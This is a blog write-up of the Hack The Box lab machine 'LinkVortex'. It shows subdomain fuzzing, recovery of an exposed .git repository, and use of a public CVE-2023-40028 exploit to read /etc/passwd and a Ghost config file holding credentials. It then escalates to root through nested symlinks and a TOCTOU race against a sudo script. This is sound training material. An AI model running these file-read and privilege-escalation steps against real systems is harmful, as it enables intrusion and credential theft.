---
title: LinkVortex - Linux Easy - HTB Writeup 
description:
slug: linkvortex-htb-writeup-linux-easy
date: 2025-04-13 00:00:00+0000
image: LinkVortex.PNG
categories:
    - Hack
    - Linux
    - Easy
tags:
    - Git
    - CVE-2023-40028
    - Symbolic links
    - Nested symlinks
    - TOCTOU

# weight: 1       # You can add weight to some posts to override the default sorting (date descending)
---
## Summary
User: Exposed .git repository & CVE-2023-40028\
Root: Nested symlinks or TOCTOU race condition exploit

## Enumeration
Starting with a simple nmap scan, we can identify that ssh and a web server are running.
{{< highlight go "hl_lines=1" >}}
$ nmap -Pn -p- 10.10.11.47 -v

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
{{< /highlight >}}

## User
### Fuzzing


We discover ""BitByBit Hardware" website running on port 80 powered by Ghost CMS.
![](Bitbybit.PNG)


After adding it to our `hosts` file, we fuzz it and uncover a subdomain: `dev.linkvortex.htb`
{{< highlight go "hl_lines=1" >}}
$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://linkvortex.htb -H "host: FUZZ.linkvortex.htb" -fs 230
<...>
dev                     [Status: 200, Size: 2538, Words: 670, Lines: 116, Duration: 15ms]
{{< /highlight >}}
![](devLinkVortex.PNG)

Fuzzing this subdomain reveals the presence of a ```.git``` directory.\
{{< highlight go "hl_lines=1" >}}
$ ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://dev.linkvortex.htb/FUZZ
<...>
.git                    [Status: 301, Size: 239, Words: 14, Lines: 8, Duration: 15ms]
.git/HEAD               [Status: 200, Size: 41, Words: 1, Lines: 2, Duration: 18ms]
.git/logs/              [Status: 200, Size: 868, Words: 59, Lines: 16, Duration: 19ms]
.git/config             [Status: 200, Size: 201, Words: 14, Lines: 9, Duration: 17ms]
.git/index              [Status: 200, Size: 707577, Words: 2171, Lines: 2172, Duration: 17ms]
index.html              [Status: 200, Size: 2538, Words: 670, Lines: 116, Duration: 16ms]
server-status           [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 19ms]
{{< /highlight >}}

We can then use the tool [GitHack](https://github.com/lijiejie/GitHack) to recover the original source code.

{{< highlight go "hl_lines=1" >}}
$ ./GitHack.py http://dev.linkvortex.htb/.git/
<...>
$ tree dev.linkvortex.htb 
dev.linkvortex.htb
├── Dockerfile.ghost
└── ghost
    └── core
        └── test
            └── regression
                └── api
                    └── admin
                        └── authentication.test.js

7 directories, 2 files
{{< /highlight >}}

Among the recovered files, we find ```authentication.test.js```, which contains the admin credentials:

{{< highlight go "hl_lines=1 5" >}}
$ less ghost/core/test/regression/api/admin/authentication.test.js
<...>
        it('complete setup', async function () {
            const email = 'test@example.com';
            const password = 'OctopiFociPilfer45';

            const requestMock = nock('https://api.github.com')
                .get('/repos/tryghost/dawn/zipball')
                .query(true)
                .replyWithFile(200, fixtureManager.getPathForFixture('themes/valid.zip'));
<...>
{{< /highlight >}}

We can then use this password to access the administration interface(username can be easily guessed as *admin@linkvortex.htb*) using http://linkvortex.htb/ghost/#/signin but it doesn't give us further access.

However, in ```Dockerfile.ghost```, we find the Ghost version: 5.58.0, which is vulnerable to [CVE-2023-40028](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2023-40028), an arbitrary file read vulnerability.
{{< highlight go "hl_lines=1" >}}
$ cat Dockerfile.ghost         
FROM ghost:5.58.0
<...>
{{< /highlight >}}

Using this [exploit](https://github.com/0xDTC/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028), we can try it to read the `/etc/passwd` file.

{{< highlight go "hl_lines=1" >}}
$ ./CVE-2023-40028 -u admin@linkvortex.htb -p OctopiFociPilfer45 -h http://linkvortex.htb
WELCOME TO THE CVE-2023-40028 SHELL
Enter the file path to read (or type 'exit' to quit): /etc/passwd
File content:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
<...>
{{< /highlight >}}

What other interresting files can we read ? Well, looking back at `Dockerfile.ghost`, we find a config file path: `/var/lib/ghost/config.production.json`.

{{< highlight go "hl_lines=1" >}}
$ cat Dockerfile.ghost         
FROM ghost:5.58.0

# Copy the config
COPY config.production.json /var/lib/ghost/config.production.json
<...>
{{< /highlight >}}

Reading this file via the CVE reveals the credentials of the user: ```bob```.

{{< highlight go "hl_lines=1 13 14" >}}
$ ./CVE-2023-40028 -u admin@linkvortex.htb -p OctopiFociPilfer45 -h http://linkvortex.htb
WELCOME TO THE CVE-2023-40028 SHELL
Enter the file path to read (or type 'exit' to quit): /var/lib/ghost/config.production.json
File content:
<...>
"mail": {
     "transport": "SMTP",
     "options": {
      "service": "Google",
      "host": "linkvortex.htb",
      "port": 587,
      "auth": {
        "user": "bob@linkvortex.htb",
        "pass": "fibber-talented-worth"
        }
      }
    }
{{< /highlight >}}

With these credentials, we canconnect via SSH the machine and retrieve the user flag.
{{< highlight go "hl_lines=1" >}}
$ ssh bob@linkvortex.htb 
bob@linkvortex:~$ pwd; ls
/home/bob
user.txt
{{< /highlight >}}

## Root
### Symlinks

Running `sudo -l`, we find that bob can execute the script ```clean_symlink.sh``` as root without a password:

{{< highlight go "hl_lines=1 8" >}}
bob@linkvortex:~$ sudo -l
Matching Defaults entries for bob on linkvortex:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty,
    env_keep+=CHECK_CONTENT

User bob may run the following commands on linkvortex:
    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
{{< /highlight >}}

If we take a look at second part of the script, we see that it checks for the presence of ```etc``` or ```root``` in the symlink target path. If such terms are detected, the link is deleted.\
Otherwise, it is moved to ```/var/quarantined```, and if the environment variable `CHECK_CONTENT` is set to true, the file content is displayed.

{{< highlight go "hl_lines=1" >}}
bob@linkvortex:~$ cat /opt/ghost/clean_symlink.sh
#!/bin/bash

QUAR_DIR="/var/quarantined"

if [ -z $CHECK_CONTENT ];then
  CHECK_CONTENT=false
fi

LINK=$1

if ! [[ "$LINK" =~ \.png$ ]]; then
  /usr/bin/echo "! First argument must be a png file !"
  exit 2
fi

if /usr/bin/sudo /usr/bin/test -L $LINK;then
  LINK_NAME=$(/usr/bin/basename $LINK)
  LINK_TARGET=$(/usr/bin/readlink $LINK)
  if /usr/bin/echo "$LINK_TARGET" | /usr/bin/grep -Eq '(etc|root)';then
    /usr/bin/echo "! Trying to read critical files, removing link [ $LINK ] !"
    /usr/bin/unlink $LINK
  else
    /usr/bin/echo "Link found [ $LINK ] , moving it to quarantine"
    /usr/bin/mv $LINK $QUAR_DIR/
    if $CHECK_CONTENT;then
      /usr/bin/echo "Content:"
      /usr/bin/cat $QUAR_DIR/$LINK_NAME 2>/dev/null
    fi
  fi
fi
{{< /highlight >}}

We can use two approaches to bypass these checks and read the `root.txt` file: nested symlinks or TOCTOU exploit.

### Method 1: nested symlinks
We create two symlinks, link1.png to link2.png and link2.png points to /root/root.txt.\
This way, link1 bypasses the keyword check since its target doesn't contain `(etc|root)`.

/home/bob/link1.png -> /home/bob/link2.png -> root.txt

{{< highlight go "hl_lines=4 7" >}}
bob@linkvortex:~$ export CHECK_CONTENT=true
bob@linkvortex:~$ ln -s /root/root.txt link2.png
bob@linkvortex:~$ ln -s $PWD/link2.png link1.png
bob@linkvortex:~$ sudo /usr/bin/bash /opt/ghost/clean_symlink.sh link1.png
Link found [ link1.png ] , moving it to quarantine
Content:
6<...>3
{{< /highlight >}}

### Method 2: TOCTOU race condition
The script checks if the file is a symlink using ```/usr/bin/test -L link.png```. Then, it calls ```basename``` and ```readlink``` based on that assumption.\
Between the check and the read of the symlink, we can exploit a race condition by continuously interchange the symlink target ```/tmp/random``` to ```/root/root.txt```.

In one terminal, we run a loop that flips the symlink target.\
In another terminal, we repeatedly execute the vulnerable script.

If the timing is right, the script displays the content of `root.txt`.\
This vulnerability is called TOCTOU (Time-of-Check to Time-of-use).\
Using this [article](https://brandon-t-elliott.github.io/tic-tac), we can try to access `root.txt`.

Terminal 1
{{< highlight go "hl_lines=1" >}}
bob@linkvortex:~$ timeout 5s bash -c 'while true; do ln -sf $PWD/random $PWD/link.png; ln -sf /root/root.txt $PWD/link.png; done'
ln: failed to create symbolic link '/home/bob/link.png': File exists
ln: failed to create symbolic link '/home/bob/link.png': File exists
<...>
{{< /highlight >}}

Terminal 2
{{< highlight go "hl_lines=1 4" >}}
bob@linkvortex:~$ timeout 2s bash -c 'while true; do sudo /usr/bin/bash /opt/ghost/clean_symlink.sh link.png; done'
Link found [ link.png ] , moving it to quarantine
Content:
6<...>3
! Trying to read critical files, removing link [ link.png ] !
Link found [ link.png ] , moving it to quarantine
Content:
6<...>3
<...>
{{< /highlight >}}


## Resources
> [CVE-2023-40028 exploit](https://github.com/0xDTC/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028)\
> [GitHack](https://github.com/lijiejie/GitHack)\
> [CTF Writeup: picoCTF 2023 - "Tic-Tac"](https://brandon-t-elliott.github.io/tic-tac)